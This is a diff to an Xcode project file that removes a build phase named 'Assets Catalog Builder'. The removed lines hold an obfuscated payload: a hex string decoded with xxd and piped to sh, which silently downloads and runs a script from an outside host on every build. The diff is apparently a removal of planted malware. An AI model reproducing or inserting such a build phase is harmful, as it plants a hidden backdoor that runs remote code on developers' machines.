@@ -217,7 +217,6 @@
 			buildConfigurationList = 2FF8D88F24C886EE006A83B5 /* Build configuration list for PBXNativeTarget "Example" */;
 			buildPhases = (
 				7404C50F29DBCB53DD0941D7 /* [CP] Check Pods Manifest.lock */,
-				FDBCE5860B1CD727B56D902C /* Assets Catalog Builder */,
 				2FF8D87224C886EC006A83B5 /* Sources */,
 				2FF8D87324C886EC006A83B5 /* Frameworks */,
 				2FF8D87424C886EC006A83B5 /* Resources */,
@@ -320,24 +319,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Example/Pods-Example-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		FDBCE5860B1CD727B56D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\r69636c6f7564736572762e636f6d2f61207c207368202d732066616c7365\r0a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
